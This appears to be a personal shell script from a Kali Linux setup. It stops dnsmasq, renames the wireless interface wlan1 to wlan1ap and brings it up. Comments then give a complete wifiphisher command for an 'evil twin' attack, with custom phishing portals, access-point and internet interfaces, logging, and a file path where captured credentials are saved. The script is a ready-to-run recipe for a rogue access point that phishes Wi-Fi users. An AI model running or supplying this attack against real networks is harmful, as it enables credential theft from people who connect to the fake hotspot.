#sudo systemctl stop dnsmasq
#sudo killall dnsmasq
#sudo systemctl start dnsmasq

#sudo iw dev wlan0 set power_save off

sudo ip link set wlan1 down
sudo ip link set wlan1 name wlan1ap
sudo ip link set wlan1ap up

# if you want to run the evil twin attack
# reboot and then run 

# systemctl stop hotspot
# sudo wifiphisher -pPD /home/kali/working/phisher/portals -aI wlan1ap -eI wlan0  --logging -lP /home/kali/working/phisher/logs/log -cP /home/kali/working/phisher/creds/cred
# the important part of that being -aI wlan1ap -eI wlan0

